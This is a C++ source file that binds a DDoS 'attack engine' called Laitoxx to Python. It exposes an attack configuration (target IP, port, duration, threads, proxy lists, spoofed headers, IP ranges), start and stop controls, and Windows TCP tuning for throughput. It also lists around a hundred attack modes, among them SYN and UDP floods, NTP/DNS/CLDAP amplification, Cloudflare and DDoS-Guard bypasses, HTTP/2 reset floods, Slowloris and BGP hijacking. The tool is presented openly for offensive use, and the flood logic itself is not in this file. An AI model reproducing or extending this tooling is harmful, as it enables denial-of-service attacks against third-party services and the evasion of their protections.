#include <pybind11/pybind11.h>
#include <pybind11/functional.h>
#include <pybind11/stl.h>
#include "attack_engine.h"
#ifdef _WIN32
#include "win_tuning.h"
#include "iocp_engine.h"
#endif
#include <iostream>
#include <memory>

namespace py = pybind11;
using namespace laitoxx;

// Python wrapper for attack instance management
class AttackInstance {
public:
    AttackInstance(const std::string& attack_type, const AttackConfig& config)
        : attack_(create_attack(attack_type, config)) {
        if (!attack_) {
            throw std::runtime_error("Unknown attack type: " + attack_type);
        }
    }

    void start() {
        if (attack_) {
            attack_->start();
        }
    }

    void stop() {
        if (attack_) {
            attack_->stop();
        }
    }

    uint64_t get_packets_sent() const {
        return attack_ ? attack_->get_packets_sent() : 0;
    }

    uint64_t get_proxy_success() const {
        return attack_ ? attack_->get_proxy_success() : 0;
    }

    uint64_t get_proxy_failures() const {
        return attack_ ? attack_->get_proxy_failures() : 0;
    }

    void set_log_callback(py::function callback) {
        if (attack_) {
            attack_->set_log_callback([callback](const std::string& msg) {
                py::gil_scoped_acquire acquire;
                try {
                    callback(msg);
                } catch (const py::error_already_set& e) {
                    std::cerr << "Python callback error: " << e.what() << std::endl;
                }
            });
        }
    }

private:
    std::unique_ptr<BaseAttack> attack_;
};

void initialize_native() {
    std::cout << "Laitoxx native C++ engine initialized" << std::endl;
}

PYBIND11_MODULE(laitoxx_core, m) {
    m.doc() = "Laitoxx high-performance C++ attack engine with pybind11 bindings";

    m.def("initialize_native", &initialize_native, "Initialize native core");

    // Expose AttackConfig structure
    py::class_<AttackConfig>(m, "AttackConfig")
        .def(py::init<>())
        .def_readwrite("target_ip", &AttackConfig::target_ip)
        .def_readwrite("port", &AttackConfig::port)
        .def_readwrite("duration_seconds", &AttackConfig::duration_seconds)
        .def_readwrite("thread_count", &AttackConfig::thread_count)
        // Proxy configuration
        .def_readwrite("use_proxy", &AttackConfig::use_proxy)
        .def_readwrite("proxy_type", &AttackConfig::proxy_type)
        .def_readwrite("proxy_list", &AttackConfig::proxy_list)
        .def_readwrite("proxy_retries", &AttackConfig::proxy_retries)
        // Header configuration
        .def_readwrite("enable_user_agent", &AttackConfig::enable_user_agent)
        .def_readwrite("enable_accept", &AttackConfig::enable_accept)
        .def_readwrite("enable_accept_language", &AttackConfig::enable_accept_language)
        .def_readwrite("enable_accept_encoding", &AttackConfig::enable_accept_encoding)
        .def_readwrite("enable_referer", &AttackConfig::enable_referer)
        .def_readwrite("enable_sec_headers", &AttackConfig::enable_sec_headers)
        .def_readwrite("enable_client_hints", &AttackConfig::enable_client_hints)
        .def_readwrite("enable_proxy_headers", &AttackConfig::enable_proxy_headers)
        .def_readwrite("custom_headers", &AttackConfig::custom_headers)
        // IP Range configuration
        .def_readwrite("use_ip_ranges", &AttackConfig::use_ip_ranges)
        .def_readwrite("ip_range_name", &AttackConfig::ip_range_name)
        .def_readwrite("ip_ranges_list", &AttackConfig::ip_ranges_list)
        // Paths
        .def_readwrite("headers_dir", &AttackConfig::headers_dir)
        .def_readwrite("ip_ranges_dir", &AttackConfig::ip_ranges_dir);

    // Expose AttackInstance
    py::class_<AttackInstance>(m, "AttackInstance")
        .def(py::init<const std::string&, const AttackConfig&>(),
             py::arg("attack_type"),
             py::arg("config"))
        .def("start", &AttackInstance::start,
             "Start the attack",
             py::call_guard<py::gil_scoped_release>())
        .def("stop", &AttackInstance::stop,
             "Stop the attack")
        .def("get_packets_sent", &AttackInstance::get_packets_sent,
             "Get number of packets sent")
        .def("get_proxy_success", &AttackInstance::get_proxy_success,
             "Get number of successful proxy connections")
        .def("get_proxy_failures", &AttackInstance::get_proxy_failures,
             "Get number of failed proxy connections")
        .def("set_log_callback", &AttackInstance::set_log_callback,
             py::arg("callback"),
             "Set logging callback function");

#ifdef _WIN32
    // ── Windows Tuning API ───────────────────────────────────────────────

    py::class_<TuningResult>(m, "TuningResult")
        .def_readonly("success", &TuningResult::success)
        .def_readonly("message", &TuningResult::message);

    py::class_<SystemInfo>(m, "SystemInfo")
        .def_readonly("cpu_count", &SystemInfo::cpu_count)
        .def_readonly("total_memory_mb", &SystemInfo::total_memory_mb)
        .def_readonly("available_memory_mb", &SystemInfo::available_memory_mb)
        .def_readonly("os_version", &SystemInfo::os_version)
        .def_readonly("is_admin", &SystemInfo::is_admin)
        .def_readonly("max_user_port", &SystemInfo::max_user_port)
        .def_readonly("tcp_timed_wait_delay", &SystemInfo::tcp_timed_wait_delay)
        .def_readonly("dynamic_port_start", &SystemInfo::dynamic_port_start)
        .def_readonly("dynamic_port_end", &SystemInfo::dynamic_port_end);

    m.def("is_running_as_admin", &is_running_as_admin,
          "Check if running with Administrator privileges");
    m.def("get_system_info", &get_system_info,
          "Get system information and current TCP/IP tuning state");
    m.def("apply_windows_tuning", &apply_windows_tuning,
          "Apply recommended Windows TCP/IP registry tuning (requires admin)");
#endif

    // Expose supported attack types
    m.attr("SUPPORTED_ATTACKS") = py::make_tuple(
        // L4 TCP/UDP Basic
        "TCP-SYN", "TCP-ACK", "TCP-BYPASS",
        "UDP", "UDP-BYPASS", "UDP-VSE",
        // L4 TCP Advanced
        "ACK", "SYNACK", "RST", "FIN",
        "CPS", "CONNECTION",
        // L4 ICMP
        "ICMP", "ICMP-REDIRECT",
        // L4 Amplification Basic
        "NTP", "DNS", "STUN", "WSD", "SADP",
        // L4 Amplification Advanced
        "SNMP", "CHARGEN", "CLDAP", "RDP-AMP", "NETBIOS",
        // L4/L7 Hybrid
        "SLOWLORIS",
        // L7 HTTP Basic
        "HTTP-FLOOD", "GET", "POST", "HEAD",
        // L7 HTTP Bypass/Obfuscation
        "OVH", "RHEX", "STOMP", "DYN", "NULL",
        // L7 HTTP Stress
        "STRESS", "COOKIE", "PPS", "EVEN", "DOWNLOADER",
        // L7 CDN/Protection Bypass
        "CLOUDFLARE", "CFB", "CFBUAM",
        "DDOSGUARD", "DGB",
        "ARVANCLOUD", "AVB",
        "GOOGLEBOT", "BOT",
        "GOOGLESHIELD", "GSB",
        "BYPASS", "KILLER",
        // L7 Specialized (Phase 2)
        "WEBSOCKET", "WS",
        "HTTP2-STREAM", "H2STREAM",
        "HTTP2-HPACK", "H2HPACK",
        "HTTP2-RST", "H2RST",
        "HTTP2-SETTINGS", "H2SETTINGS",
        "HTTP3", "QUIC",
        "GRAPHQL",
        "SMTP", "IMAP", "POP3",
        "SIP", "RTP", "RTCP",
        "WEBDAV",
        // L3 (Phase 2)
        "SMURF", "FRAGGLE",
        "POD", "PING-OF-DEATH",
        "IPV6-NDP", "NDP",
        "BGP", "BGP-HIJACK",
        // L7 Database (Phase 3)
        "REDIS",
        "MONGODB", "MONGO",
        "ELASTICSEARCH", "ELASTIC",
        // L2 (Phase 3)
        "ARP", "ARP-FLOOD",
        "VLAN", "VLAN-HOP",
        // L7 Application-Specific (Phase 3)
        "WORDPRESS", "WP-XMLRPC",
        "APACHE-RANGE",
        "TOR",
        "SLOW-HEADERS",
        "SLOW-POST", "RUDY"
    );
}
